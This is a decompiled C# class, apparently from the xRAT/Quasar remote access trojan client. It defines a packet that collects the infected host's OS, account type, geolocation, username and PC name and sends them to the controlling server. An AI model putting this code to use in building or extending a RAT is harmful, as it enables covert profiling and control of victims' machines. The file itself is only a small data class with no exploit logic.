using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x020000DA RID: 218
	[Serializable]
	public class GetAuthenticationResponse : IPacket
	{
		// Token: 0x17000104 RID: 260
		// (get) Token: 0x06000573 RID: 1395 RVA: 0x000049C2 File Offset: 0x00002BC2
		// (set) Token: 0x06000574 RID: 1396 RVA: 0x000049CA File Offset: 0x00002BCA
		public string Version { get; set; }

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x06000575 RID: 1397 RVA: 0x000049D3 File Offset: 0x00002BD3
		// (set) Token: 0x06000576 RID: 1398 RVA: 0x000049DB File Offset: 0x00002BDB
		public string OperatingSystem { get; set; }

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x06000577 RID: 1399 RVA: 0x000049E4 File Offset: 0x00002BE4
		// (set) Token: 0x06000578 RID: 1400 RVA: 0x000049EC File Offset: 0x00002BEC
		public string AccountType { get; set; }

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x06000579 RID: 1401 RVA: 0x000049F5 File Offset: 0x00002BF5
		// (set) Token: 0x0600057A RID: 1402 RVA: 0x000049FD File Offset: 0x00002BFD
		public string Country { get; set; }

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x0600057B RID: 1403 RVA: 0x00004A06 File Offset: 0x00002C06
		// (set) Token: 0x0600057C RID: 1404 RVA: 0x00004A0E File Offset: 0x00002C0E
		public string CountryCode { get; set; }

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x0600057D RID: 1405 RVA: 0x00004A17 File Offset: 0x00002C17
		// (set) Token: 0x0600057E RID: 1406 RVA: 0x00004A1F File Offset: 0x00002C1F
		public string Region { get; set; }

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x0600057F RID: 1407 RVA: 0x00004A28 File Offset: 0x00002C28
		// (set) Token: 0x06000580 RID: 1408 RVA: 0x00004A30 File Offset: 0x00002C30
		public string City { get; set; }

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x06000581 RID: 1409 RVA: 0x00004A39 File Offset: 0x00002C39
		// (set) Token: 0x06000582 RID: 1410 RVA: 0x00004A41 File Offset: 0x00002C41
		public int ImageIndex { get; set; }

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x06000583 RID: 1411 RVA: 0x00004A4A File Offset: 0x00002C4A
		// (set) Token: 0x06000584 RID: 1412 RVA: 0x00004A52 File Offset: 0x00002C52
		public string Id { get; set; }

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x06000585 RID: 1413 RVA: 0x00004A5B File Offset: 0x00002C5B
		// (set) Token: 0x06000586 RID: 1414 RVA: 0x00004A63 File Offset: 0x00002C63
		public string Username { get; set; }

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x06000587 RID: 1415 RVA: 0x00004A6C File Offset: 0x00002C6C
		// (set) Token: 0x06000588 RID: 1416 RVA: 0x00004A74 File Offset: 0x00002C74
		public string PCName { get; set; }

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x06000589 RID: 1417 RVA: 0x00004A7D File Offset: 0x00002C7D
		// (set) Token: 0x0600058A RID: 1418 RVA: 0x00004A85 File Offset: 0x00002C85
		public string Tag { get; set; }

		// Token: 0x0600058B RID: 1419 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetAuthenticationResponse()
		{
		}

		// Token: 0x0600058C RID: 1420 RVA: 0x00012F28 File Offset: 0x00011128
		public GetAuthenticationResponse(string version, string operatingsystem, string accounttype, string country, string countrycode, string region, string city, int imageindex, string id, string username, string pcname, string tag)
		{
			this.Version = version;
			this.OperatingSystem = operatingsystem;
			this.AccountType = accounttype;
			this.Country = country;
			this.CountryCode = countrycode;
			this.Region = region;
			this.City = city;
			this.ImageIndex = imageindex;
			this.Id = id;
			this.Username = username;
			this.PCName = pcname;
			this.Tag = tag;
		}

		// Token: 0x0600058D RID: 1421 RVA: 0x00004A8E File Offset: 0x00002C8E
		public void Execute(Client client)
		{
			client.Send<GetAuthenticationResponse>(this);
		}
	}
}
